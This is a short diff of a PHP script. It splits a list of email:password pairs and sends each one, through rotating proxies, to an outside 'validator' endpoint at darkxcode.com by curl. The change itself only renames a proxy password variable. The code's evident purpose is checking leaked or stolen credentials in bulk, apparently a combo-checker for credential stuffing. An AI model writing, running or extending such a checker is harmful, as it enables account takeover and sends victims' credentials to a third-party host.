@@ -34,7 +34,7 @@ foreach ($lists as $list) {
     else if(strpos($list, ":") !== false) list($email, $pass) = explode(":", $list);
     else $email = $list;
     if(empty($email)) continue;
-    $api = "https://darkxcode.com/validator/bocom/?list=$list&proxy=$Proxies&proxyPWD=$proxy_pwd";
+    $api = "https://darkxcode.com/validator/bocom/?list=$list&proxy=$Proxies&proxyPWD=$proxy_pass";
     // CURL
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $api);
